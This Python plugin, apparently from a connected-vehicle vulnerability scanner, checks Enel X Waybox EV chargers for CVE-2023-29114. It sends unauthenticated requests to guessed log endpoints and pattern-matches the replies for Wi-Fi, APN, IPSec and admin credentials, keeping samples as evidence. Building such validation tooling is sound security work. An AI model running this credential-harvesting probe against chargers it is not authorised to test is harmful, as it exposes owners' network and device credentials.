#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket
import re

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


_LOG_PATHS = [
    "/log",
    "/logs",
    "/system/log",
    "/admin/log",
    "/management/log",
    "/api/log",
    "/api/logs",
    "/cgi-bin/log",
    "/debug/log",
]

_CREDENTIAL_PATTERNS = [
    r"password\s*[:=]\s*\S+",
    r"passwd\s*[:=]\s*\S+",
    r"psk\s*[:=]\s*\S+",
    r"secret\s*[:=]\s*\S+",
    r"ipsec\s*[:=]\s*\S+",
    r"apn\s*[:=]\s*\S+",
    r"ssid\s*[:=]\s*\S+",
    r"key\s*[:=]\s*['\"]?\w{8,}",
]


def _http_get(host: str, port: int, path: str, timeout: float = 6.0) -> dict:
    """Send raw HTTP GET and return status + body excerpt."""
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    result = {
        "path": path,
        "connected": False,
        "status": "",
        "body_len": 0,
        "credential_patterns_found": [],
        "error": "",
    }
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        result["connected"] = True
        sock.sendall(request)
        resp = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
            if len(resp) > 65536:
                break
        sock.close()

        resp_text = resp.decode(errors="replace")
        if "\r\n\r\n" in resp_text:
            header_part, body = resp_text.split("\r\n\r\n", 1)
        else:
            header_part, body = resp_text, ""

        first_line = header_part.split("\r\n")[0] if header_part else ""
        result["status"] = first_line
        result["body_len"] = len(body)

        # Search for credential patterns in response body
        body_lower = body.lower()
        for pat in _CREDENTIAL_PATTERNS:
            matches = re.findall(pat, body_lower)
            if matches:
                result["credential_patterns_found"].extend(matches[:3])

    except ConnectionRefusedError:
        result["error"] = "connection_refused"
    except socket.timeout:
        result["error"] = "timeout"
    except OSError as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 80))

    evidence = {
        "cve": "CVE-2023-29114",
        "target": f"{target_ip}:{port}",
        "technique": (
            "Unauthenticated HTTP GET to web management log endpoints; "
            "check for credential exposure (Wi-Fi PSK, APN, IPSec, admin password)"
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-29114",
        "sensitive_data_risk": [
            "Wi-Fi SSID/PSK", "APN credentials", "IPSec PSK",
            "Admin web credentials", "Firmware version", "Internal IPs",
        ],
    }

    probe_results = []
    credentials_exposed = False
    any_connected = False

    for path in _LOG_PATHS:
        result = _http_get(target_ip, port, path)
        probe_results.append(result)
        if result["connected"]:
            any_connected = True
        if result["credential_patterns_found"] and "200" in result["status"]:
            credentials_exposed = True
            evidence["exposed_path"] = path
            evidence["credential_samples"] = result["credential_patterns_found"]

    evidence["probe_results"] = probe_results

    if credentials_exposed:
        vulnerable = True
        evidence["note"] = (
            f"Credentials found in unauthenticated log endpoint {evidence.get('exposed_path')}. "
            "CVE-2023-29114 confirmed."
        )
    elif any_connected:
        # Check if any path returned 200 without auth
        unauth_200 = [r for r in probe_results if "200" in r.get("status", "") and r["body_len"] > 0]
        if unauth_200:
            vulnerable = None
            evidence["note"] = f"Log endpoint accessible without auth; manual review of content needed"
        else:
            vulnerable = False
            evidence["note"] = "Log endpoints return non-200 or require authentication"
    else:
        vulnerable = None
        evidence["note"] = "Enel Waybox web interface not reachable; cannot probe for log exposure"

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": vulnerable is None,
    }


VULN = {
    "id": 58,
    "cve": "CVE-2023-29114",
    "year": 2023,
    "domain": "IVI/云端/EVSE/OS",
    "vendor_product": "Enel X Waybox EV charger",
    "component": "web management logs",
    "type": "访问控制不足/敏感信息泄露",
    "summary": "Web管理应用日志可被未授权访问，泄露Wi-Fi/APN/IPSEC凭据。",
    "source_description": "System logs could be accessed through web management application due to a lack of access control.\n\n\nAn attacker can obtain the following sensitive information:\n\n•     Wi-Fi access point credentials to which the EV charger can connect.\n\n•     APN web address and credentials.\n\n•     IPSEC credentials.\n\n•     Web interface access credentials for user and admin accounts.\n\n•     JuiceBox system components (software installed, model, firmware version, etc.).\n\n•     C2G configuration details.\n\n•     Internal IP addresses.\n\n•     OTA firmware update configurations (DNS servers).\n\nAll the credentials are stored in logs in an unencrypted plaintext format.",
    "poc_status": "公开公告；大多未见一步式PoC",
    "research_value": "作为近两年前后演进基线，对比2024-2026风险变化。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29114",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-29114",
        "https://support-emobility.enelx.com/content/dam/enelxmobility/italia/documenti/manuali-schede-tecniche/Waybox-3-Security-Bulletin-06-2024-V1.pdf",
        "https://cveawg.mitre.org/api/cve/CVE-2023-29114"
    ],
    "affected": [
        {
            "vendor": "Enel X",
            "product": "JuiceBox Pro 3.0 22kW Cellular",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "2.1.1.0_JB3VU096A",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2023-29114",
        "Enel",
        "Waybox",
        "charger",
        "web",
        "management",
        "logs",
        "System",
        "could",
        "accessed",
        "application",
        "lack",
        "access",
        "control",
        "obtain",
        "following",
        "sensitive",
        "information",
        "Wi-Fi",
        "point",
        "credentials",
        "which",
        "connect",
        "address",
        "IPSEC",
        "interface",
        "user",
        "Enel X",
        "JuiceBox Pro 3.0 22kW Cellular"
    ]
}


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc49CVE202329114AccessControlAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-058'
    meta_poc_name = 'CVE-2023-29114 敏感信息泄露 Active Validation'
    meta_cve_id = 'CVE-2023-29114'
    meta_severity = 'High'
    meta_protocol = 'wifi'
    meta_target_os = ['all']
    meta_required_params = ['wireless_scan_text']
    meta_profiles = ['wifi']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2023-29114'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2023-29114']
    meta_attack_surface = '无线/外设接口'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "49_Enel_Waybox_Log_Access_Control_Info_Leak_Audit") if "VULN" in dir() else "49_Enel_Waybox_Log_Access_Control_Info_Leak_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc49CVE202329114AccessControlAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
